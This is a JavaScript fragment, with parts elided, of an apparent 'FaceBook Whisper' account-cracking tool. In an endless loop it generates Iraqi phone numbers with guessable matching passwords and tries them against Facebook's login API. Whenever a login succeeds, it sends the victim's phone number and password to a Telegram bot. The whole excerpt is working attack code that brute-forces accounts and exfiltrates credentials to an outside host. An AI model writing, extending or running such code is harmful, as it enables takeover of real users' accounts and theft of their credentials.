...
console.clear();
console.log(
    figlet.textSync("FaceBook") +
        colors.yellow("Whisper </>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"),
);
...
async function main() {
    while (true) {
        const whisper = Array.from(
            { length: 7 },
            () => user[Math.floor(Math.random() * user.length)],
        ).join("");
        const email = "+964772" + whisper;
        const password = "772" + whisper;
        if (email === "" || password === "") {
            process.exit();
        }
        const url = "https://api.facebook.com/method/auth.login";
        ...
        if ("access_token" in req.data) {
            ...
            await axios.post(
                `https://api.telegram.org/bot${tok}/sendMessage?chat_id=${ID}&text=.💀.Owner @oussamabakrine💀.\n ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎.\n.✉. E-mail ==> ${email} \n.🚫. PassWord ==> ${password} \n.ꨄ︎ ––––––––––––––––︎ ꨄ︎. \n.😈 هق مشا.`,
            );
        } else {
